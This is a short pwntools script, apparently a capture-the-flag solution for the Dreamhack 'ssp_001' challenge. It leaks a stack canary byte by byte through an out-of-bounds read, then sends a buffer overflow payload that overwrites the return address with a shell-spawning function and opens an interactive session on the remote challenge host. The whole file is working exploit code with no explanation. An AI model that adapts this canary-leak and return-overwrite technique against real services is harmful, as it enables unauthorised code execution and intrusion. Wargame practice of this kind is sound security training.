from pwn import *
# p = process("./ssp_001")
p = remote('host3.dreamhack.games', 10631)
context.arch = 'amd64'

canary = b''
get_shell = 0x12ef

for i in range(8):
    p.sendline(b"P")
    p.sendline(str(0x88 + i).encode())
    p.recvuntil(b"is : ")
    canary += p8(int(p.recvline(), 16))

print(canary)

payload = b'A' * 0x48 
payload += canary 
payload += b'B' * 8 
payload += p64(get_shell)

p.sendline(b"E")
p.sendline(str(len(payload)).encode())
p.sendline(payload)

p.interactive()